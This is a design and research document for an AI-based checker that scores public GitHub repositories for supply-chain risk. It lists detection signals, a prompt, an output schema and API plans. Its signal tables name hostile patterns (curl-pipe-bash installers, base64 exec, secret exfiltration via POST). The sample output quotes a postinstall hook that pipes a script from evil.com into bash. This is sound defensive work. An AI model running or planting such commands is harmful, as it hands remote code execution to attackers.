# Feature Landscape: GitHub Security Checker

**Domain:** AI-powered supply chain security analyzer for public GitHub repositories
**Researched:** 2026-03-28
**Confidence:** HIGH (most findings verified against multiple current sources from 2025)

---

## Table Stakes

Features users expect. Missing = product feels incomplete or untrustworthy.

| Feature | Why Expected | Complexity | Notes |
|---------|--------------|------------|-------|
| Repo URL input + parse | Entry point for the whole product | Low | Validate github.com/{owner}/{repo} format, handle trailing slashes and `.git` suffixes |
| Safe / Risky / Dangerous verdict | Users need a clear, actionable result, not raw data | Low | Three-tier is better than five — reduces analysis paralysis |
| Risk score (0-100) | Gives numeric precision behind the verdict | Low | Map: 0-30 = Safe, 31-65 = Risky, 66-100 = Dangerous |
| Reasoning summary | Users won't trust a verdict with no explanation | Medium | 3-5 bullet findings max; concise, not exhaustive |
| Repo metadata display | Stars, forks, last commit date, language — orientates the user | Low | Pull from `/repos/{owner}/{repo}` endpoint |
| Loading state with progress | AI inference takes time; users abandon without feedback | Low | Show stages: "Fetching data... Analyzing signals... Getting AI verdict..." |
| On-chain verification badge | Core product differentiator; without it this is just another scanner | Medium | Show tx hash + settlement type; link to block explorer |
| Shareable permalink | Security results are only useful if they can be shared with teams | Low | `/result/{analysisId}` — static page, reads cached result |
| x402 payment gate | Required per project spec — also filters out abuse | Medium | Wagmi/viem on Base Sepolia with OPG token |

---

## Differentiators

Features that set this product apart. Not expected by users, but valued.

| Feature | Value Proposition | Complexity | Notes |
|---------|-------------------|------------|-------|
| Cryptographic proof that AI output is unmodified | "This verdict cannot be faked" — unique in this space | Medium | OpenGradient TEE signs output; store hash on-chain with INDIVIDUAL_FULL mode |
| Dual-model consensus (e.g. GPT-4 + Claude) | If two independent models agree it's Dangerous, trust increases | Medium | Use OpenGradient multi-provider API; display both verdicts + consensus |
| Specific supply chain attack signal detection | Named attack patterns (typosquatting, postinstall hooks, tag mutation) not generic "code smells" | High | Requires structured prompt with named signal categories |
| GitHub Actions workflow analysis | `.github/workflows/*.yml` is a major 2025 attack vector; most scanners ignore it | Medium | Fetch via Contents API; look for base64/curl/exfil patterns |
| Verdict badge embeddable in README | Developers want to show "this repo is verified safe" | Low | Static SVG badge at `/badge/{analysisId}` — chain-verified |

---

## Anti-Features

Features to explicitly NOT build in v1.

| Anti-Feature | Why Avoid | What to Do Instead |
|--------------|-----------|-------------------|
| Full codebase clone + static analysis | Too slow (minutes), too expensive (storage), rate limits will kill it | Analyze the 5-10 most security-relevant files via Contents API |
| CVE database lookup (Snyk/OSV) | Adds external dependency, increases latency, out of scope per PROJECT.md | Flag dependency names for AI to reason about; add in v2 |
| Authentication / GitHub OAuth | Adds complexity, auth management; private repos are out of scope | Stick to public API; offer "connect GitHub" as v2 upsell |
| Continuous monitoring / alerts | Requires persistent infra, webhooks, email system | One-shot analysis is the right MVP scope |
| Detailed diff / code viewer | This is not a code browser; users want verdict, not the evidence | Show 2-3 excerpts of suspicious code in the findings list only |
| Star/fork inflation detection via history | Requires hundreds of API calls; burns rate limit fast | Flag low absolute numbers as a heuristic instead |

---

## Security Signals: What to Analyze

This is the core research finding. Signals are grouped by source and weighted by attack prevalence.

### Signal Group 1: Repository Metadata (GitHub API — 1 request)

Endpoint: `GET /repos/{owner}/{repo}`

| Signal | Red Flag Threshold | Attack Type | Confidence |
|--------|--------------------|-------------|------------|
| Account age (owner `created_at`) | < 30 days | Throwaway account for malicious campaign | HIGH |
| Repo age (`created_at`) | < 7 days for a claimed popular tool | Repo confusion / typosquatting | HIGH |
| Stars (`stargazers_count`) | 0-5 on a package claiming wide use | Fake legitimacy signal | HIGH |
| Forks (`forks_count`) | Very high forks vs. very low stars | Forking exploit (Shai-Hulud pattern) | MEDIUM |
| Open issues vs. closed | 0 issues ever on an active project | Fake/inactive project | MEDIUM |
| Topics (`topics`) | Suspicious keyword stuffing (e.g., crypto+wallet+stealer) | SEO poisoning | MEDIUM |
| Description mentions payment/wallet | "earn money", "crypto arbitrage", "keylogger" | Social engineering bait | MEDIUM |
| License missing | No `license` field | Malware authors avoid legal paper trails | MEDIUM |
| Archived (`archived: true`) but still referenced | Users installing abandoned, unmaintained code | Stale dependency risk | LOW |
| Has downloads / releases | No releases but package.json exists | Package not properly published | LOW |

### Signal Group 2: Contributor Profile (GitHub API — 1-2 requests)

Endpoints: `GET /repos/{owner}/{repo}/contributors`, `GET /users/{username}`

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| Single contributor on a claimed important package | One person = single point of failure / compromise | Supply chain single point | HIGH |
| Contributor account age < 30 days | Throwaway account | Campaign infrastructure | HIGH |
| Contributor has no other repos or activity | Ghost account | Fake legitimacy | HIGH |
| Commit email uses temp domain | `@mailinator.com`, `@guerrillamail.com` | Sockpuppet account | MEDIUM |
| Sudden new contributor with high commit velocity | Account takeover | Tag mutation attack (tj-actions pattern) | HIGH |

### Signal Group 3: Commit History (GitHub API — 1 request)

Endpoint: `GET /repos/{owner}/{repo}/commits?per_page=10`

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| Very few commits (1-3) for a "complete" package | Minimal history = minimal audit trail | Malware drop | HIGH |
| Large time gap then sudden commit burst | Dormant repo suddenly "updated" | Account takeover / backdoor injection | HIGH |
| Commit messages are generic ("update", "fix") | No meaningful history | Low-effort fake | MEDIUM |
| Commit author email doesn't match GitHub account | Commit spoofing | Impersonation / social engineering | HIGH |
| Tag points to a commit not in default branch history | Shadow commit (deleted fork exploit) | Tag mutation attack | HIGH |

**Note on tag mutation:** Git tag changes are NOT recorded in GitHub's audit log for free-tier accounts. This was the exact vector used in the tj-actions/changed-files attack (CVE-2025-30066) that affected 23,000 repositories. The API cannot detect this directly — the AI must reason about the *absence* of a tag/commit lineage match.

### Signal Group 4: Package Manifest Analysis (GitHub API — 1-2 requests)

Endpoints: `GET /repos/{owner}/{repo}/contents/package.json`, `setup.cfg`, `pyproject.toml`, `requirements.txt`

**npm-specific signals:**

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| `preinstall`, `postinstall`, `install` scripts present | Automatic code execution on install | Credential theft via install hook | HIGH |
| `scripts` section runs `curl`, `wget`, `node -e`, or shell commands | Remote payload fetch | Multi-stage malware dropper | HIGH |
| Dependency name is near-match of a popular package | `typescriptjs`, `react-router-dom.js`, `@acitons/artifact` | Typosquatting | HIGH |
| Version pinned to `*` or `latest` | Allows silent updates to malicious version | Mutable dependency | HIGH |
| `bin` field with executable pointing to obfuscated file | CLI tool that runs malicious code | Trojan CLI | MEDIUM |
| Package name has >10 characters with dashes mimicking real names | 71.2% of malicious packages use this pattern | Typosquatting | MEDIUM |
| Dependencies list includes known malicious packages | Direct inclusion | Dependency confusion | HIGH |
| `main` points to minified/obfuscated file | Hides true behavior | Code obfuscation | HIGH |

**Python-specific signals:**

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| `setup.py` has `cmdclass` override or `subprocess.run` | Arbitrary code at install time | Install hook exploit | HIGH |
| `__init__.py` has base64-decoded exec | `exec(base64.b64decode(...))` pattern | Hidden payload | HIGH |
| `test.py` or `tests/` contains production-level network calls | Code hidden in "test" files | Obfuscated exfiltration | HIGH |
| PowerShell embedded in setup.py | Cross-platform exfiltration | Credential stealer | HIGH |
| Import of `os`, `subprocess`, `socket` in install scripts | System access during install | Privilege escalation | MEDIUM |
| Unusually small file count for a "complete" library | Malware minimizes footprint | Stealth malware | MEDIUM |

### Signal Group 5: README Analysis (GitHub API — 1 request)

Endpoint: `GET /repos/{owner}/{repo}/readme`

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| Links to external payment sites (Bitcoin, pay-to-download) | `satoshidisk.com`, Patreon-gated exploit PoC | Fake PoC / social engineering | HIGH |
| Claims to be a cracked version of commercial software | "Free Photoshop crack", "free Spotify premium" | Malware disguised as piracy | HIGH |
| Installation via `curl | bash` one-liner with no explanation | Remote code execution encouraged | Malware installer | HIGH |
| Promises unrealistic results ("earn $500/day", "100% undetectable") | Social engineering bait | Credential stealer / RAT | HIGH |
| README is copy-pasted from a legitimate project | Repo confusion attack content | Typosquatting / repo confusion | HIGH |
| No README at all | Minimal effort project | High-risk heuristic | MEDIUM |
| README mentions "keylog", "stealer", "RAT", "infostealer" (even as "PoC") | Dual-use malware | Potentially malicious tool | MEDIUM |

### Signal Group 6: GitHub Actions Workflows (GitHub API — 1-2 requests)

Endpoint: `GET /repos/{owner}/{repo}/contents/.github/workflows`

This is a major 2025 attack vector. The tj-actions/changed-files attack (CVE-2025-30066) and GhostAction campaign both used compromised workflows to steal 3,325+ secrets.

| Signal | Red Flag | Attack Type | Confidence |
|--------|----------|-------------|------------|
| Workflow uses `curl` or `wget` to fetch a remote script | Exfiltration / remote payload | Supply chain via Actions | HIGH |
| Workflow contains base64-encoded commands | `echo "..." | base64 -d | bash` | Obfuscated execution | HIGH |
| Workflow uses `gist.githubusercontent.com` as source | Used in tj-actions attack | Supply chain compromise | HIGH |
| Workflow sends data via `curl -X POST` to external domain | Secret exfiltration | GhostAction pattern | HIGH |
| Workflow references action by mutable tag (not commit SHA) | `uses: actions/checkout@v3` not `@abc1234` | Tag mutation attack vector | HIGH |
| Workflow has `env:` section with `${{ secrets.* }}` printed to logs | Secrets in public logs | CVE-2025-30066 pattern | HIGH |

---

## AI Prompt Structure

### What the AI Needs to Analyze

The AI receives a structured JSON bundle of all fetched data and must produce structured JSON output. Chain-of-thought reasoning should be explicit so the verdict is explainable.

**Input bundle to AI (construct before calling OpenGradient):**

```
{
  "repo": {
    "full_name": "owner/repo",
    "description": "...",
    "created_at": "...",
    "pushed_at": "...",
    "stargazers_count": N,
    "forks_count": N,
    "open_issues_count": N,
    "license": null | { "name": "MIT" },
    "topics": [...],
    "language": "Python"
  },
  "owner": {
    "login": "...",
    "created_at": "...",
    "public_repos": N,
    "followers": N
  },
  "contributors": [
    { "login": "...", "contributions": N }
  ],
  "recent_commits": [
    { "sha": "...", "message": "...", "author": "...", "date": "..." }
  ],
  "readme_text": "... (truncated to 2000 chars) ...",
  "package_json": { ... } | null,
  "setup_py_excerpt": "... (first 1000 chars) ..." | null,
  "workflow_files": [
    { "name": "ci.yml", "content": "... (truncated) ..." }
  ]
}
```

**Recommended system prompt structure:**

```
You are a supply chain security analyst specializing in malicious GitHub repositories.
Analyze the following repository data for security risks.

ANALYZE THESE SPECIFIC SIGNAL CATEGORIES IN ORDER:
1. ACCOUNT CREDIBILITY: Owner account age, number of repos, followers
2. REPOSITORY CREDIBILITY: Repo age, stars, license, description quality
3. PACKAGE MANIFEST RISKS: postinstall hooks, suspicious scripts, typosquatting names
4. CODE BEHAVIOR RISKS: base64 decode+exec, network calls in install scripts, obfuscation
5. COMMIT INTEGRITY: Commit frequency, author consistency, suspicious timing patterns
6. README RED FLAGS: External payment links, piracy claims, unrealistic promises
7. GITHUB ACTIONS RISKS: External fetches, base64 commands, mutable action tags, secret logging

For each category, provide:
- findings: specific evidence found (or "none found")
- risk_level: none | low | medium | high | critical

Then provide:
- overall_score: integer 0-100 (0=completely safe, 100=confirmed malicious)
- verdict: "Safe" | "Risky" | "Dangerous"
- top_findings: array of 3-5 most important findings, each as one sentence
- reasoning: 2-3 sentence explanation of the verdict

SCORING GUIDE:
- 0-30: Safe — typical open source project, no red flags
- 31-65: Risky — some concerning signals, use with caution, investigate further
- 66-100: Dangerous — clear malicious indicators, do not install

Respond ONLY with valid JSON matching this schema. No markdown, no explanation outside JSON.
```

**Why this structure works:**
- Numbered categories force the model to not skip steps (chain-of-thought)
- Per-category risk level enables granular findings display
- Scoring guide reduces hallucinated verdict inflation
- "Respond ONLY with valid JSON" enables reliable parsing
- OWASP-backed prompt specificity improves security detection accuracy by 20-25% per 2025 research

### Output Schema (AI Returns)

```json
{
  "overall_score": 72,
  "verdict": "Dangerous",
  "categories": {
    "account_credibility": { "risk_level": "high", "findings": "Owner account created 3 days ago with 0 followers and 1 repository." },
    "repository_credibility": { "risk_level": "medium", "findings": "Repository has 2 stars and no license. Created 5 days ago." },
    "package_manifest_risks": { "risk_level": "critical", "findings": "postinstall script runs: node -e \"require('child_process').exec('curl http://evil.com/payload | bash')\"" },
    "code_behavior_risks": { "risk_level": "critical", "findings": "base64-encoded exec block found in __init__.py" },
    "commit_integrity": { "risk_level": "low", "findings": "2 commits only, messages are generic 'initial commit' and 'update'" },
    "readme_red_flags": { "risk_level": "medium", "findings": "README links to satoshidisk.com for additional files" },
    "github_actions_risks": { "risk_level": "none", "findings": "No GitHub Actions workflows present" }
  },
  "top_findings": [
    "postinstall hook fetches and executes a remote shell script from an unknown domain",
    "Owner account is 3 days old with no prior activity",
    "base64-encoded executable block found in package initialization code",
    "README links to a pay-to-download file host (satoshidisk.com)"
  ],
  "reasoning": "This repository exhibits a cluster of indicators consistent with a credential-stealing malware dropper. The combination of a throwaway account, aggressive install-time code execution, and obfuscated initialization code is the same pattern used in the PhantomRaven and Shai-Hulud campaigns of 2025."
}
```

---

## Output Format: Verdict Display

### Verdict Page Layout (in priority order)

1. **Verdict banner** — Full-width, color-coded: green (Safe), amber (Risky), red (Dangerous)
2. **Risk score** — Large numeric display (e.g. "72 / 100") with a risk bar
3. **Top findings** — Bulleted list, 3-5 items, plain English
4. **Category breakdown** — Expandable accordion per signal group with risk badge
5. **Verification proof block** — tx hash, block number, settlement mode, OpenGradient inference ID
6. **Share button** — Copies permalink; also renders embeddable badge SVG

### Shareable Permalink Requirements

- URL format: `/result/{analysisId}` where `analysisId` is the on-chain inference ID
- Result is cached (do not re-charge the user if they revisit)
- Page shows all verdict data plus: "This result was verified by OpenGradient TEE on [date], tx [hash]"
- The on-chain hash makes the result tamper-evident — if the AI output were changed, the hash would not match
- This is the cryptographic credibility mechanism: verifiable, not just shareable

**Why this matters for credibility:**
The INDIVIDUAL_FULL settlement mode on OpenGradient stores a hash of both the input and output on-chain. Anyone can verify the hash matches the displayed result. This is meaningfully different from "we ran an AI scan" — it proves *which* AI, *what inputs*, and *what output* at a specific point in time.

---

## GitHub API Usage Plan

### Requests per Analysis (stay within 60/hour unauthenticated)

| Request | Endpoint | Count | Notes |
|---------|----------|-------|-------|
| Repo metadata | `GET /repos/{owner}/{repo}` | 1 | Stars, forks, license, topics, dates |
| README | `GET /repos/{owner}/{repo}/readme` | 1 | Base64-decoded, truncate to 3000 chars |
| Contributors | `GET /repos/{owner}/{repo}/contributors?per_page=5` | 1 | Top 5 only |
| Recent commits | `GET /repos/{owner}/{repo}/commits?per_page=10` | 1 | Last 10 commits |
| Package manifest | `GET /repos/{owner}/{repo}/contents/package.json` | 1 | Or setup.py, pyproject.toml |
| Workflow list | `GET /repos/{owner}/{repo}/contents/.github/workflows` | 1 | Directory listing only |
| First workflow file | `GET /repos/{owner}/{repo}/contents/.github/workflows/ci.yml` | 1 | Only fetch first/largest |
| Owner profile | `GET /users/{owner}` | 1 | Account age, follower count |

**Total: 8 requests per analysis.** This leaves substantial headroom within the 60/hour limit.

### Rate Limit Strategy

- **Check headers before fetching**: inspect `X-RateLimit-Remaining` in every response
- **Abort gracefully**: if remaining < 5, return partial results with a "rate limited" notice
- **Cache aggressively**: store full API responses per repo URL for 1 hour in Redis or Vercel KV
  - Identical repo URL = return cached result, skip API calls entirely
  - This means heavy usage only burns the limit once per repo per hour
- **Defer optional requests**: owner profile and workflow fetches are lowest priority; skip if limit is tight
- **Do not use IP-rotation**: violates GitHub ToS; use caching instead
- **For production v2**: register a GitHub OAuth App (5,000 req/hour authenticated) — trivial upgrade

### Data Fetching Order (fail-fast)

1. Repo metadata (if repo is private or doesn't exist, fail immediately with clear message)
2. Owner profile
3. Contributors
4. Recent commits
5. README
6. Package manifest (try package.json → setup.py → pyproject.toml in order)
7. Workflow directory listing
8. First workflow file content (optional — skip if limit is tight)

---

## How Similar Tools Work (Competitive Reference)

### Socket.dev
- Static analysis of npm/PyPI packages, not GitHub repos directly
- Analyzes: install scripts, obfuscated code, shell usage, filesystem/network API usage
- Detects: typosquatting, known malware versions, protestware, mutable git dependencies
- Does NOT: run AI for holistic analysis, provide cryptographic proof of analysis

### Snyk
- Vulnerability database lookup (CVE/OSV matching) — not behavioral analysis
- Integrates into CI/CD via GitHub Actions, not one-shot URL analysis
- SARIF format output for GitHub Security tab
- Does NOT: analyze repo credibility signals, detect new malware without CVE entry

### GitHub Native (CodeQL / Dependabot)
- Requires repo owner to enable; cannot analyze arbitrary third-party repos
- CodeQL: static analysis for *your* code, not for repos you're evaluating
- Dependabot: alerts on known CVEs in dependencies you've already installed
- Does NOT: give a safe/unsafe verdict on a repo before you install it

### OpenSSF Malicious Packages (ossf/malicious-packages)
- Crowdsourced database of confirmed malicious packages in OSV format
- Only covers *known* malicious packages; misses zero-day / novel attacks
- Does NOT: AI analysis, real-time scanning

**Gap this product fills:** None of these tools answer "is this specific GitHub repo safe to use right now, before I install it?" with a single-click, AI-backed, cryptographically verified answer. That is the unique position.

---

## Feature Dependencies

```
Repo URL input
  → GitHub API fetching (8 requests)
    → AI prompt construction (all fetched data bundled)
      → OpenGradient inference (TEE-secured)
        → On-chain hash settlement (INDIVIDUAL_FULL mode)
          → Verdict display page
            → Shareable permalink (needs analysisId from on-chain)
              → Embeddable badge (needs permalink)
```

x402 payment must gate the AI inference step. If payment fails, do not call OpenGradient.

---

## MVP Recommendation

**Build in this order:**

1. GitHub API data fetcher (8 endpoints, structured JSON output) — unblocks everything
2. AI prompt + OpenGradient call with structured JSON output schema — core value
3. Verdict display page (score, findings, verdict banner) — user-facing value
4. x402 payment gate — required per spec, integrate before public release
5. On-chain proof block display + shareable permalink — differentiator, do last

**Defer to v2:**
- Embeddable README badge — nice to have, requires stable permalink scheme first
- CVE database lookup via OSV API — additive, not core
- Second AI model (dual consensus) — add once single-model path is stable
- GitHub OAuth for higher rate limits — only needed at scale

---

## Sources

- [Supply Chain Attacks Targeting GitHub Actions Increased in 2025 — Dark Reading](https://www.darkreading.com/application-security/supply-chain-attacks-targeting-github-actions-increased-in-2025)
- [tj-actions/changed-files CVE-2025-30066 — Palo Alto Unit42](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/)
- [GitHub Actions Supply Chain Attack — Wiz Blog](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066)
- [GhostAction Campaign: 3,325 Secrets Stolen — GitGuardian Blog](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [Shai-Hulud npm Supply Chain Attack — Palo Alto Unit42](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)
- [Malicious npm Packages 2025 Recap — Xygeni](https://xygeni.io/blog/malicious-packages-2025-recap-malicious-code-and-npm-malware-trends/)
- [Malicious PyPI packages deliver SilentSync RAT — Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/malicious-pypi-packages-deliver-silentsync-rat)
- [LiteLLM PyPI Supply Chain Attack — Sonatype](https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer)
- [GitHub besieged by malware and repo confusion — Snyk Blog](https://snyk.io/blog/github-malware-repositories-repo-confusion/)
- [Over 100,000 Infected Repos Found via Repo Confusion — Apiiro](https://apiiro.com/blog/malicious-code-campaign-github-repo-confusion-attack/)
- [GitHub Actions Vulnerable to Typosquatting — The Hacker News](https://thehackernews.com/2024/09/github-actions-vulnerable-to.html)
- [Repo Squatting: Hackers Using GitHub Features to Hijack Repos — Security Online](https://securityonline.info/repo-squatting-how-hackers-are-using-githubs-own-features-to-hijack-official-repos/)
- [Beware Fake PoC Repositories and Malicious Code — Uptycs](https://www.uptycs.com/blog/threat-research-report-team/fake-poc-repositories-malicious-code-github)
- [How to Prompt LLMs for Better, Faster Security Reviews — Crashoverride](https://crashoverride.com/blog/prompting-llm-security-reviews)
- [Rate Limits for the REST API — GitHub Docs](https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api)
- [npm Threats and Mitigations — npm Docs](https://docs.npmjs.com/threats-and-mitigations/)
- [OpenGradient x402 Upgrade — OpenGradient Blog](https://www.opengradient.ai/blog/x402-opengradient-upgrade-trustless-verifiable-inference)
- [OpenGradient Architecture — OpenGradient Docs](https://docs.opengradient.ai/learn/architecture/)
- [Socket.dev — How it works](https://socket.dev/)
- [CISA Advisory: Supply Chain Compromise tj-actions CVE-2025-30066](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066)
